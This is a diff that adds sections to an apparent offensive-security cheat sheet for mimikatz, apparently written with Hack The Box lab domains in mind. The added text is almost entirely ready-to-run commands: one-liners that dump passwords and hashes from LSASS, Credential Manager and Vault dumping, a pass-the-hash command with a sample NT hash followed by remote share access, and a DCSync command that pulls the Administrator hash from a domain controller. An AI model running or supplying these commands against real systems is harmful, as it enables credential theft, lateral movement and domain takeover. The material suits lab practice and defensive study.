@@ -189,6 +189,49 @@ misc::cmd
 * This will open a new command prompt with elevated privlages to all machines
 * Access other Machines! - You will now have another command prompt with access to all other machines on the network
 
+## Single-Shot Execution
+
+When in a non-interactive shell (e.g. PS-Session, sliver execute), run mimikatz as a one-liner:
+
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+.\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
+```
+
+## Credential Manager and Vault
+
+When hunting for cached clear-text credentials, always run both of these:
+
+```
+mimikatz # sekurlsa::credman
+mimikatz # vault::cred
+```
+
+`sekurlsa::credman` dumps Credential Manager entries from LSASS. `vault::cred` dumps Windows Vault stored credentials.
+
+## Pass the Hash (sekurlsa::pth)
+
+Spawn a process authenticated as a different user using their NT hash:
+
+```
+mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+
+From the spawned cmd.exe you can access remote shares:
+
+```cmd
+dir \\DC01\C$
+type \\DC01\david\david.txt
+```
+
+## DCSync
+
+Requires Domain Admin or replication rights. Extract a specific user's hash from the domain controller:
+
+```
+.\mimikatz.exe "lsadump::dcsync /domain:domain.htb /user:Administrator" "exit"
+```
+
 ## DPAPI&#x20;
 
 * Credit for below section:
